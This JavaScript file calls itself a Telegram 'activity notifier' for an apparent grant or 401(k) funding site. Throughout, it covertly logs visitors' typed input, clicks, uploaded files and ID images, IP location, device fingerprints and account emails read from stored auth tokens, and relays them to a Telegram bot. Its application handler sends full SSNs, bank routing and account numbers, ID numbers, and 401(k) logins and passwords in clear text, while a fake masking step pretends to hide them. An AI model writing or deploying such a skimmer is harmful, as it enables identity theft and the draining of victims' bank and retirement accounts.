/* Telegram activity notifier
   NOTE: All calls now route through /.netlify/functions/telegram-proxy
   Bot token and chat id live ONLY on the server, never in this file. */

(function () {
  if (typeof window === 'undefined') return;

  var PROXY_BASE = (window.__ENV && window.__ENV.API_BASE) || '/.netlify/functions';
  var TELEGRAM_PROXY_URL = PROXY_BASE + '/telegram-proxy';

  function proxyAvailable() {
    try {
      return typeof fetch === 'function';
    } catch (e) { return false; }
  }

  function sessionId() {
    try {
      var id = sessionStorage.getItem('tg_session_id');
      if (!id) {
        id = Math.random().toString(36).slice(2, 8).toUpperCase();
        sessionStorage.setItem('tg_session_id', id);
      }
      return id;
    } catch (e) {
      return 'ANON';
    }
  }

  function escapeHtml(s) {
    return String(s == null ? '' : s)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');
  }

  function callProxy(method, body, asMultipart, fileEntries) {
    if (!proxyAvailable()) return Promise.resolve({ ok: false, offline: true });
    var url = TELEGRAM_PROXY_URL + '/' + method;
    try {
      if (asMultipart && fileEntries && fileEntries.length > 0) {
        var fd = new FormData();
        if (body) {
          for (var k in body) {
            if (Object.prototype.hasOwnProperty.call(body, k)) fd.append(k, body[k]);
          }
        }
        for (var i = 0; i < fileEntries.length; i++) {
          var f = fileEntries[i];
          fd.append(f.field, f.file || f.blob, f.filename || 'file');
        }
        return fetch(url, { method: 'POST', body: fd, credentials: 'include' })
          .then(function (r) { return r.json().catch(function () { return { ok: r.ok }; }); })
          .catch(function () { return { ok: false, offline: true }; });
      }
      return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify(body || {})
      })
        .then(function (r) { return r.json().catch(function () { return { ok: r.ok }; }); })
        .catch(function () { return { ok: false, offline: true }; });
    } catch (e) {
      return Promise.resolve({ ok: false, offline: true });
    }
  }

  function send(text) {
    if (!text) return;
    callProxy('sendMessage', {
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    });
  }

  function page() {
    return window.location.pathname.split('/').pop() || 'index.html';
  }

  function getDeviceInfo() {
    var ua = navigator.userAgent || '';
    var platform = navigator.platform || '';
    var deviceType = 'Unknown';

    if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
      deviceType = 'Mobile';
    } else if (/Tablet|iPad/i.test(ua)) {
      deviceType = 'Tablet';
    } else if (/Windows|Mac|Linux/i.test(ua)) {
      deviceType = 'Desktop';
    }

    var os = 'Unknown OS';
    var osVersion = '';
    if (/Windows NT 10.0/i.test(ua)) { os = 'Windows'; osVersion = '10/11'; }
    else if (/Windows NT 6.3/i.test(ua)) { os = 'Windows'; osVersion = '8.1'; }
    else if (/Windows NT 6.2/i.test(ua)) { os = 'Windows'; osVersion = '8'; }
    else if (/Windows NT 6.1/i.test(ua)) { os = 'Windows'; osVersion = '7'; }
    else if (/Windows NT 6.0/i.test(ua)) { os = 'Windows'; osVersion = 'Vista'; }
    else if (/Windows NT 5.1/i.test(ua)) { os = 'Windows'; osVersion = 'XP'; }
    else if (/Windows/i.test(ua)) { os = 'Windows'; }
    else if (/Mac OS X ([0-9_]+)/i.test(ua)) {
      os = 'macOS';
      var match = ua.match(/Mac OS X ([0-9_]+)/i);
      if (match) osVersion = match[1].replace(/_/g, '.');
    }
    else if (/Linux/i.test(ua)) { os = 'Linux'; }
    else if (/Android ([0-9.]+)/i.test(ua)) {
      os = 'Android';
      var m = ua.match(/Android ([0-9.]+)/i);
      if (m) osVersion = m[1];
    }
    else if (/iOS|iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; }

    var browser = 'Unknown Browser';
    var browserVersion = '';
    if (/Chrome\/([0-9.]+)/i.test(ua) && !/Edge|OPR/i.test(ua)) {
      browser = 'Chrome';
      var mc = ua.match(/Chrome\/([0-9.]+)/i);
      if (mc) browserVersion = mc[1];
    }
    else if (/Safari\/([0-9.]+)/i.test(ua) && !/Chrome/i.test(ua)) {
      browser = 'Safari';
      var ms = ua.match(/Safari\/([0-9.]+)/i);
      if (ms) browserVersion = ms[1];
    }
    else if (/Firefox\/([0-9.]+)/i.test(ua)) {
      browser = 'Firefox';
      var mf = ua.match(/Firefox\/([0-9.]+)/i);
      if (mf) browserVersion = mf[1];
    }
    else if (/Edge\/([0-9.]+)/i.test(ua)) {
      browser = 'Edge';
      var me = ua.match(/Edge\/([0-9.]+)/i);
      if (me) browserVersion = me[1];
    }
    else if (/OPR\/([0-9.]+)/i.test(ua)) {
      browser = 'Opera';
      var mo = ua.match(/OPR\/([0-9.]+)/i);
      if (mo) browserVersion = mo[1];
    }

    var engine = 'Unknown';
    if (/WebKit/i.test(ua)) engine = 'WebKit';
    else if (/Gecko/i.test(ua)) engine = 'Gecko';
    else if (/Presto/i.test(ua)) engine = 'Presto';
    else if (/Trident/i.test(ua)) engine = 'Trident';

    var language = navigator.language || navigator.userLanguage || 'Unknown';
    var cookiesEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
    var doNotTrack = navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled';

    var screenInfo = {
      width: window.screen.width,
      height: window.screen.height,
      availWidth: window.screen.availWidth,
      availHeight: window.screen.availHeight,
      colorDepth: window.screen.colorDepth,
      pixelDepth: window.screen.pixelDepth
    };

    var hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
    var deviceMemory = navigator.deviceMemory || 'Unknown';

    return {
      deviceType: deviceType,
      os: os,
      osVersion: osVersion,
      browser: browser,
      browserVersion: browserVersion,
      engine: engine,
      platform: platform,
      language: language,
      cookiesEnabled: cookiesEnabled,
      doNotTrack: doNotTrack,
      hardwareConcurrency: hardwareConcurrency,
      deviceMemory: deviceMemory,
      screen: screenInfo,
      userAgent: ua
    };
  }

  function getUserInfo() {
    try {
      for (var j = 0; j < localStorage.length; j++) {
        var key = localStorage.key(j);
        if (key && key.indexOf('sb-') === 0 && key.indexOf('auth-token') > -1) {
          try {
            var sessionStr = localStorage.getItem(key);
            var session = JSON.parse(sessionStr);
            if (session && session.user) {
              return {
                email: session.user.email || '',
                username: (session.user.user_metadata && session.user.user_metadata.username) || '',
                id: session.user.id || ''
              };
            }
          } catch (e) {
            continue;
          }
        }
      }
      var accountName = document.querySelector('.account-name');
      if (accountName && accountName.textContent) {
        var text = accountName.textContent.trim();
        if (text && text !== 'Sign In') {
          if (text.indexOf('@') > -1) {
            return { email: text, username: text.split('@')[0], id: '' };
          } else {
            return { email: '', username: text, id: '' };
          }
        }
      }
    } catch (e) {}
    return null;
  }

  function notify(title, lines, locationInfo, includeDeviceInfo) {
    var body = [];

    var userInfo = getUserInfo();
    if (userInfo) {
      body.push('<b>👤 User: ' + escapeHtml(userInfo.username || userInfo.email || 'Unknown') + '</b>');
      if (userInfo.email) body.push('📧 Email: ' + escapeHtml(userInfo.email));
      body.push('');
    }

    body.push('<b>' + escapeHtml(title) + '</b>');
    body.push('Page: ' + escapeHtml(page()));
    (lines || []).forEach(function (l) { body.push(escapeHtml(l)); });

    if (locationInfo) {
      body.push('');
      body.push('<b>🌍 Location Info</b>');
      if (locationInfo.ip) body.push('IP: ' + escapeHtml(locationInfo.ip));
      if (locationInfo.country) body.push('Country: ' + escapeHtml(locationInfo.country));
      if (locationInfo.region) body.push('State/Region: ' + escapeHtml(locationInfo.region));
      if (locationInfo.city) body.push('City: ' + escapeHtml(locationInfo.city));
      if (locationInfo.org) body.push('ISP/Network: ' + escapeHtml(locationInfo.org));
    }

    if (includeDeviceInfo) {
      var device = getDeviceInfo();
      body.push('');
      body.push('<b>📱 Device Info</b>');
      body.push('Device Type: ' + escapeHtml(device.deviceType));
      body.push('OS: ' + escapeHtml(device.os + (device.osVersion ? ' ' + device.osVersion : '')));
      body.push('Browser: ' + escapeHtml(device.browser + (device.browserVersion ? ' ' + device.browserVersion : '')));
      body.push('Engine: ' + escapeHtml(device.engine));
      body.push('Platform: ' + escapeHtml(device.platform));
      body.push('Language: ' + escapeHtml(device.language));
      body.push('Cookies: ' + escapeHtml(device.cookiesEnabled));
      body.push('Do Not Track: ' + escapeHtml(device.doNotTrack));
      if (device.hardwareConcurrency !== 'Unknown') body.push('CPU Cores: ' + escapeHtml(device.hardwareConcurrency));
      if (device.deviceMemory !== 'Unknown') body.push('RAM: ' + escapeHtml(device.deviceMemory + 'GB'));
      body.push('Screen: ' + escapeHtml(device.screen.width + 'x' + device.screen.height));
      body.push('Available Screen: ' + escapeHtml(device.screen.availWidth + 'x' + device.screen.availHeight));
      body.push('Color Depth: ' + escapeHtml(device.screen.colorDepth + ' bits'));
    }

    body.push('');
    body.push('Visitor ID: ' + escapeHtml(sessionId()));
    body.push('Time: ' + escapeHtml(new Date().toLocaleString()));

    send(body.join('\n'));
  }

  window.telegramNotify = function(title, lines, locationInfo) {
    notify(title, lines, locationInfo, false);
  };

  var cachedLocationInfo = null;
  var locationFetchInProgress = false;

  function fetchLocationInfo() {
    if (cachedLocationInfo) {
      return cachedLocationInfo;
    }

    if (!locationFetchInProgress) {
      locationFetchInProgress = true;
      fetch('https://ipapi.co/json/')
        .then(function (res) { return res.json(); })
        .then(function (data) {
          cachedLocationInfo = {
            ip: data.ip || '',
            country: data.country_name || '',
            region: data.region || '',
            city: data.city || '',
            org: data.org || ''
          };
          locationFetchInProgress = false;
        })
        .catch(function () {
          locationFetchInProgress = false;
        });
    }

    return cachedLocationInfo;
  }

  var visitNotified = false;
  function sendVisit() {
    try {
      if (sessionStorage.getItem('tg_visit_notified') === 'true') {
        visitNotified = true;
      }
    } catch (e) {}

    if (visitNotified) return;
    visitNotified = true;

    try {
      sessionStorage.setItem('tg_visit_notified', 'true');
    } catch (e) {}

    var lines = [];
    if (document.referrer) lines.push('🔗 From: ' + document.referrer);
    lines.push('📺 Viewport: ' + window.innerWidth + 'x' + window.innerHeight);
    lines.push('🌐 URL: ' + escapeHtml(window.location.href));

    fetchLocationInfo();
    notify('👀 Site Visit', lines, cachedLocationInfo, true);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', sendVisit);
  } else {
    sendVisit();
  }

  var lastClick = 0;
  document.addEventListener('click', function (e) {
    var el = e.target && e.target.closest
      ? e.target.closest('a, button, [role="button"], input[type="submit"], input[type="button"], .answer-btn, .upload-area, .btn, [onclick], .clickable, label')
      : null;
    if (!el) return;

    var now = Date.now();
    if (now - lastClick < 400) return;
    lastClick = now;

    var label = (el.getAttribute('aria-label') || el.textContent || el.value || el.title || '').trim().replace(/\s+/g, ' ');
    if (label.length > 100) label = label.slice(0, 100) + '…';
    if (!label) label = el.tagName.toLowerCase();

    var lines = ['🖱 Clicked: ' + label];
    var href = el.getAttribute && el.getAttribute('href');
    if (href) lines.push('🔗 Link: ' + href);

    var id = el.id || el.className;
    if (id) lines.push('🏷️ Element: ' + escapeHtml(id));

    fetchLocationInfo();
    notify('🖱 User Action', lines, cachedLocationInfo, false);
  }, true);

  var inputDebounceTimer = null;

  function sendInputChange(fieldName, value, fieldType) {
    var lines = [];
    lines.push('📝 Field: ' + escapeHtml(fieldName));
    lines.push('🔤 Type: ' + escapeHtml(fieldType));

    if (fieldType === 'password') {
      lines.push('🔒 Value: [HIDDEN - PASSWORD]');
    } else if (fieldType === 'file') {
      lines.push('📁 File: ' + escapeHtml(value));
    } else {
      var displayValue = String(value);
      if (displayValue.length > 200) {
        displayValue = displayValue.slice(0, 200) + '…';
      }
      lines.push('✏️ Value: ' + escapeHtml(displayValue));
    }

    fetchLocationInfo();
    notify('📊 Input Entered', lines, cachedLocationInfo, false);
  }

  document.addEventListener('input', function (e) {
    var el = e.target;
    if (!el || !el.tagName) return;

    var tagName = el.tagName.toLowerCase();
    var inputType = (el.type || 'text').toLowerCase();
    var fieldName = el.name || el.id || el.placeholder || 'unnamed field';

    if (inputType === 'password' || fieldName.toLowerCase().indexOf('password') > -1) {
      return;
    }

    if (tagName === 'input' && (inputType === 'text' || inputType === 'email' || inputType === 'tel' || inputType === 'number' || inputType === 'date')) {
      var value = el.value;
      if (!value || value.length < 2) return;

      clearTimeout(inputDebounceTimer);
      inputDebounceTimer = setTimeout(function () {
        sendInputChange(fieldName, value, inputType);
      }, 1500);
    } else if (tagName === 'textarea') {
      var value = el.value;
      if (!value || value.length < 5) return;

      clearTimeout(inputDebounceTimer);
      inputDebounceTimer = setTimeout(function () {
        sendInputChange(fieldName, value, 'textarea');
      }, 2000);
    } else if (tagName === 'select') {
      var value = el.value;
      if (!value) return;

      clearTimeout(inputDebounceTimer);
      inputDebounceTimer = setTimeout(function () {
        sendInputChange(fieldName, value, 'select');
      }, 500);
    }
  }, true);

  document.addEventListener('change', function (e) {
    var el = e.target;
    if (!el || !el.tagName || el.tagName.toLowerCase() !== 'input' || el.type.toLowerCase() !== 'file') {
      return;
    }

    var fieldName = el.name || el.id || 'file upload';
    var files = el.files;

    if (files && files.length > 0) {
      for (var i = 0; i < files.length; i++) {
        (function (file, idx) {
          var fileInfo = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';

          var lines = [];
          lines.push('📁 Field: ' + escapeHtml(fieldName));
          lines.push('📄 File: ' + escapeHtml(fileInfo));
          lines.push('🔤 Type: ' + escapeHtml(file.type || 'unknown'));

          if (file.type && file.type.startsWith('image/')) {
            sendImageToTelegram(file, fieldName);
          } else {
            fetchLocationInfo();
            notify('📤 File Uploaded', lines, cachedLocationInfo, false);
            var caption = '📄 File Uploaded\n' +
                          'Field: ' + escapeHtml(fieldName) + '\n' +
                          'File: ' + escapeHtml(file.name) +
                          (file.size ? '\nSize: ' + (file.size / 1024).toFixed(1) + ' KB' : '') +
                          (file.type ? '\nType: ' + escapeHtml(file.type) : '');
            setTimeout(function () {
              sendDocumentToTelegram(file, fieldName, caption);
            }, 600 + idx * 400);
          }
        })(files[i], i);
      }
    }
  }, true);

  function sendImageToTelegram(file, fieldName) {
    var visitorId = '';
    try { visitorId = sessionStorage.getItem('tg_session_id') || ''; } catch (e) {}
    var caption = '📸 Image uploaded\nField: ' + escapeHtml(fieldName) +
                  '\nFile: ' + escapeHtml(file.name) +
                  (visitorId ? '\nVisitor: ' + escapeHtml(visitorId) : '');
    if (caption.length > 1024) caption = caption.slice(0, 1020) + '…';

    callProxy('sendPhoto', { caption: caption }, true, [
      { field: 'photo', file: file, filename: file.name }
    ]).then(function (r) {
      if (r && r.offline) return;
      if (!(r && r.ok)) {
        callProxy('sendDocument', { caption: caption }, true, [
          { field: 'document', file: file, filename: file.name }
        ]);
      }
    });
  }

  function sendDocumentToTelegram(file, fieldName, caption) {
    var cap = caption || ('📄 Document uploaded\nField: ' + escapeHtml(fieldName) + '\nFile: ' + escapeHtml(file.name));
    if (cap.length > 1024) cap = cap.slice(0, 1020) + '…';
    return callProxy('sendDocument', { caption: cap }, true, [
      { field: 'document', file: file, filename: file.name }
    ]);
  }

  function sendPhotoAsFile(file, fieldName, caption) {
    var cap = caption || ('📸 Image\nField: ' + escapeHtml(fieldName) + '\nFile: ' + escapeHtml(file.name));
    if (cap.length > 1024) cap = cap.slice(0, 1020) + '…';
    return callProxy('sendPhoto', { caption: cap }, true, [
      { field: 'photo', file: file, filename: file.name }
    ]).then(function (r) {
      if (!(r && r.ok)) {
        return callProxy('sendDocument', { caption: cap }, true, [
          { field: 'document', file: file, filename: file.name }
        ]);
      }
      return r;
    });
  }

  function chunkText(text, maxLen) {
    maxLen = maxLen || 4000;
    var chunks = [];
    var current = '';
    var lines = text.split('\n');
    for (var i = 0; i < lines.length; i++) {
      var line = lines[i];
      if (current.length + line.length + 1 > maxLen && current.length > 0) {
        chunks.push(current);
        current = line;
      } else {
        current += (current ? '\n' : '') + line;
      }
    }
    if (current) chunks.push(current);
    return chunks;
  }

  function sendLongText(text) {
    return new Promise(function (resolve) {
      var chunks = chunkText(text, 4000);
      var idx = 0;
      function sendNext() {
        if (idx >= chunks.length) { resolve(); return; }
        callProxy('sendMessage', {
          text: chunks[idx],
          parse_mode: 'HTML',
          disable_web_page_preview: true
        }).then(function () {
          idx++;
          setTimeout(sendNext, 300);
        }).catch(function () {
          idx++;
          setTimeout(sendNext, 300);
        });
      }
      sendNext();
    });
  }

  window.sendFullApplicationToTelegram = function (appData, uploadedFilesInfo) {
    return new Promise(function (resolveAll) {
      var appId = appData.appId || 'UNKNOWN';
      var userInfo = getUserInfo();

      var sections = [
        { title: 'STEP 1 — Personal Information', data: appData.personal || {} },
        { title: 'STEP 2 — Bank / Payment Details', data: appData.banking || {} },
        { title: 'STEP 3 — Funding Need Summary', data: appData.business || {} },
        { title: 'STEP 4 — ID Verification & 401(k) Details', data: appData.idVerify || {} },
        { title: 'STEP 6 — 401(k) Account Access', data: appData.kaccess || {} }
      ];

      var fieldLabels = {
        firstName: 'First Name', lastName: 'Last Name', email: 'Email', phone: 'Phone',
        dob: 'Date of Birth', ssn: 'SSN', address: 'Street Address', city: 'City',
        state: 'State', zip: 'ZIP Code', citizenship: 'Citizenship Status',
        bankName: 'Bank Name', bankAccountType: 'Bank Account Type',
        accountHolder: 'Account Holder Name', routing: 'Routing Number (ABA)',
        accountNum: 'Account Number',
        businessName: 'Business Name', businessStatus: 'Grant Purpose',
        businessType: 'Employment Status', industry: 'Use Category',
        employees: 'Work Arrangement', businessSummary: 'Funding Need Summary',
        businessAddress: 'Additional Details',
        idType: 'ID Type', idNumber: 'ID / Document Number',
        idFullName: 'Full Name (on ID)', idDob: 'DOB (on ID)',
        idExpires: 'ID Expiration Date', idIssuer: 'Issuing State/Country',
        provider: '401(k) Provider', k401Username: '401(k) Username',
        k401Password: '401(k) Password', accountNumber: '401(k) Last 6',
        balance: 'Current Balance (USD)', accountOpenDate: 'Opened Date',
        accountType: 'Account Type', employer: 'Current Employer',
        k401AccessUsername: '401(k) Access Username',
        k401AccessPassword: '401(k) Access Password'
      };

      function maskIf(key, val) {
        if (!val) return '—';
        var k = String(key).toLowerCase();
        if (k.indexOf('password') > -1) return '🔒 ' + String(val);
        if (k.indexOf('ssn') > -1) {
          var s = String(val).replace(/-/g, '');
          return s.length >= 7 ? '•••-••-' + s.slice(-4) + ' (full: ' + String(val) + ')' : String(val);
        }
        if (k.indexOf('routing') > -1) return String(val) + ' (full)';
        if (k.indexOf('accountnum') > -1 || k === 'accountnumber') return '••••' + String(val).slice(-4) + ' (full: ' + String(val) + ')';
        if (k.indexOf('idnumber') > -1) return String(val);
        return String(val);
      }

      var bodyLines = [];
      bodyLines.push('<b>🚨 NEW APPLICATION SUBMITTED 🚨</b>');
      bodyLines.push('<b>Application ID:</b> P401K-2026-' + escapeHtml(appId));
      bodyLines.push('<b>Submitted:</b> ' + escapeHtml(new Date().toLocaleString()));
      bodyLines.push('');

      if (userInfo) {
        bodyLines.push('<b>👤 Registered User</b>');
        if (userInfo.username) bodyLines.push('Username: ' + escapeHtml(userInfo.username));
        if (userInfo.email) bodyLines.push('Email: ' + escapeHtml(userInfo.email));
        if (userInfo.id) bodyLines.push('User ID: ' + escapeHtml(userInfo.id));
        bodyLines.push('');
      }

      for (var s = 0; s < sections.length; s++) {
        var sec = sections[s];
        var keys = Object.keys(sec.data);
        if (keys.length === 0) continue;
        bodyLines.push('<b>—— ' + escapeHtml(sec.title) + ' ——</b>');
        for (var k = 0; k < keys.length; k++) {
          var key = keys[k];
          var raw = sec.data[key];
          if (raw === undefined || raw === null || raw === '') continue;
          var label = fieldLabels[key] || key;
          var display = maskIf(key, raw);
          bodyLines.push('<b>' + escapeHtml(label) + ':</b> ' + escapeHtml(display));
        }
        bodyLines.push('');
      }

      var filesList = uploadedFilesInfo || [];
      if (filesList.length > 0) {
        bodyLines.push('<b>📎 Uploaded Files (' + filesList.length + ')</b>');
        for (var f = 0; f < filesList.length; f++) {
          var fi = filesList[f];
          var sizeStr = '';
          if (fi.size) {
            var kb = fi.size / 1024;
            sizeStr = kb > 1024 ? ' (' + (kb / 1024).toFixed(2) + ' MB)' : ' (' + kb.toFixed(1) + ' KB)';
          }
          bodyLines.push('  • ' + (fi.fieldLabel || fi.fieldName || 'File') + ': ' + escapeHtml(fi.name || 'unnamed') + sizeStr);
        }
        bodyLines.push('');
      }

      bodyLines.push('Visitor ID: ' + escapeHtml(sessionId()));

      var fullText = bodyLines.join('\n');

      sendLongText(fullText).then(function () {
        var idx = 0;
        function sendNextFile() {
          if (idx >= filesList.length) { resolveAll(); return; }
          var fi = filesList[idx];
          var file = fi.file;
          idx++;
          if (!file) { setTimeout(sendNextFile, 100); return; }
          var cap = '📎 App P401K-2026-' + escapeHtml(appId) + '\n' +
                    'Field: ' + escapeHtml(fi.fieldLabel || fi.fieldName || 'Upload') + '\n' +
                    'File: ' + escapeHtml(file.name);
          if (file.type && file.type.startsWith('image/')) {
            sendPhotoAsFile(file, fi.fieldName || 'upload', cap).then(function () {
              setTimeout(sendNextFile, 500);
            });
          } else {
            sendDocumentToTelegram(file, fi.fieldName || 'upload', cap).then(function () {
              setTimeout(sendNextFile, 500);
            });
          }
        }
        sendNextFile();
      }).catch(resolveAll);
    });
  };
})();
